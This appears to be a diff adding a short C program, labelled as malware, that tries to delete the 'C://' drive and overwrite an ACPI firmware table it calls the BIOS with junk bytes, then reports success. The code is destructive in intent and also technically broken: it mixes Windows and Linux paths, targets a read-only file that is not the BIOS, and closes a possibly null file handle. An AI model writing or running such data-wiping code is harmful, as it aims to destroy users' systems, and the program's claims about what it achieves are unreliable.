@@ -1,0 +1,29 @@
+#include <stdio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main() {
+
+    // Delete C:// directory
+    if (remove("C://") == 0) {
+        printf("C:// directory deleted.\n");
+    } else {
+        printf("C:// directory not deleted.\n");
+    }
+    
+    // Overwrite BIOS with junk data
+    FILE *bios = fopen("/sys/firmware/acpi/tables/MSDM", "wb");
+    if (bios == NULL) {
+        printf("BIOS not found.\n");
+    } else {
+        char junk[1024] = {0};
+        memset(junk, 0xFF, 1024);
+        fwrite(junk, 1, 1024, bios);
+    }
+    fclose(bios);
+    
+    // Done
+    printf("Malware executed successfully.\n");
+    return 0;
+}
